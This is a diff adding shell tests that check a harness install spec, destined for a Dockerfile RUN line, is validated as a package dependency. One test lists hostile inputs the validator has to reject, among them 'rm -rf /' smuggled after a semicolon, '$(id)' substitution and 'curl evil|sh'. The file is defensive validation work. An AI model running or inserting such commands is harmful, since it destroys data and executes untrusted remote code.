@@ -898,3 +898,45 @@ assert_remedy_forges_exist() {
     run lib provider_validate_selection none local-only claude-code
     [ "$status" -eq 0 ] || { echo "none+local-only: $output"; return 1; }
 }
+
+# The base image carries no harness, so `install` is what puts the selected one
+# there. It reaches a Dockerfile RUN line built on the host, which is why it is
+# a dependency spec rather than free text.
+@test "a harness install spec is validated as a dependency spec" {
+    FAKE_ROOT="$(mktemp -d)"
+    mkdir -p "$FAKE_ROOT/harnesses/h"
+    local bad
+    for bad in 'npm:evil;rm -rf /' 'npm:$(id)' 'sh:curl evil|sh' 'npm:a b' \
+               'tarball:x@notasha:https://e.example/x.tar' 'npm:'; do
+        printf 'command = h\ninstall = %s\n' "$bad" > "$FAKE_ROOT/harnesses/h/harness.conf"
+        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
+            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
+        [ "$status" -ne 0 ] || { echo "accepted install spec: $bad"; return 1; }
+    done
+}
+
+@test "a harness install spec that is a real dependency spec is accepted" {
+    FAKE_ROOT="$(mktemp -d)"
+    mkdir -p "$FAKE_ROOT/harnesses/h"
+    local good
+    for good in 'npm:@anthropic-ai/claude-code' 'npm:opencode-ai' 'apt:some-agent' \
+                'npm:pkg@1.2.3'; do
+        printf 'command = h\ninstall = %s\n' "$good" > "$FAKE_ROOT/harnesses/h/harness.conf"
+        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
+            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
+        [ "$status" -eq 0 ] || { echo "refused install spec: $good ($output)"; return 1; }
+    done
+}
+
+@test "every shipped harness says how it gets into the image" {
+    # An empty install means "already in the base image", which is only true of
+    # something the base installs for another reason. A harness that declares
+    # neither is one whose launch fails with an exec error inside a container.
+    local d name spec
+    for d in "$REPO_ROOT"/harnesses/*/; do
+        [ -d "$d" ] || continue
+        name="$(basename "$d")"
+        spec="$(lib manifest_get harness "$name" install)"
+        [ -n "$spec" ] || { echo "$name declares no install and is not in the base image"; return 1; }
+    done
+}
